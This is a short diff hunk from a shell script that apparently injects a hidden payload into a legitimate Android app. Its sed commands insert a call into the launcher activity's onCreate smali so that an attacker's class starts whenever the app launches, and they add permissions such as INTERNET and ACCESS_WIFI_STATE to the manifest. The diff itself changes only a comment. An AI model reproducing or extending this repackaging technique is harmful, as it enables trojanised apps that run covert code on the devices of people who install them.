@@ -112,7 +112,7 @@ fi
 #add invoke to launching .smali file to call the payload upon app launch
 sed -i "/method.*onCreate(/ainvoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali
 
-#add all dependencies... because, why not?
+#add all permissions... because, why not?
 sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.SET_WALLPAPER\"/>" /tmp/original/AndroidManifest.xml
 sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.INTERNET\"/>" /tmp/original/AndroidManifest.xml
 sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>" /tmp/original/AndroidManifest.xml
